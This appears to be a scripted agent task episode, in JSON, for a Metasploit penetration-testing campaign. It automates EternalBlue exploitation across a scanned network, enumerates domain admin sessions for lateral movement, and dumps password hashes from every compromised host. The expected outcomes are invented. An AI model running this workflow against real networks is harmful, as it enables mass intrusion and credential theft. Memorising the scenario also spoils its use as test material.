{
  "episode_id": "PENT_EXPLOIT_METASPLOIT_EP03",
  "title": "Automated Network Exploitation Campaign",
  "description": "Automate scan and exploit of entire network using resource scripts and database",
  "difficulty": "advanced",
  "steps": [
    {
      "step_number": 1,
      "instruction": "Create workspace",
      "tool": "msf_database_workspace_management",
      "parameters": {
        "workspace_name": "corporate_pentest"
      },
      "expected_outcome": "Workspace 'corporate_pentest' created and activated"
    },
    {
      "step_number": 2,
      "instruction": "Import nmap scan",
      "tool": "msf_database_workspace_management",
      "parameters": {
        "workspace_name": "corporate_pentest"
      },
      "expected_outcome": "db_nmap imported: 234 hosts, 1,234 services in database"
    },
    {
      "step_number": 3,
      "instruction": "Create automation script",
      "tool": "msf_resource_script_automation",
      "parameters": {
        "script_path": "/tmp/auto_exploit"
      },
      "expected_outcome": "Resource script created: scans SMB, tests EternalBlue, exploits vulnerables"
    },
    {
      "step_number": 4,
      "instruction": "Run automated exploitation",
      "tool": "msf_resource_script_automation",
      "parameters": {
        "script_path": "/tmp/auto_exploit"
      },
      "expected_outcome": "Script completed: 45 hosts scanned, 12 vulnerable, 8 exploited successfully"
    },
    {
      "step_number": 5,
      "instruction": "Review compromised hosts",
      "tool": "msf_database_workspace_management",
      "parameters": {
        "workspace_name": "corporate_pentest"
      },
      "expected_outcome": "8 active meterpreter sessions from automated campaign"
    },
    {
      "step_number": 6,
      "instruction": "Enumerate privileges",
      "tool": "msf_post_modules_privilege_escalation",
      "parameters": {
        "session_id": "*",
        "post_module": "post/windows/gather/enum_logged_on_users"
      },
      "expected_outcome": "Found domain admin logged into 3 systems - lateral movement opportunity"
    },
    {
      "step_number": 7,
      "instruction": "Dump all credentials",
      "tool": "meterpreter_post_exploitation_shell",
      "parameters": {
        "session_id": "*",
        "command": "hashdump"
      },
      "expected_outcome": "Collected 67 password hashes across 8 systems"
    }
  ],
  "success_criteria": "Automated exploitation of 8/234 hosts, collected 67 hashes, identified domain admin sessions",
  "cleanup": "Network-wide compromise achieved through automation - demonstrates need for patching"
}
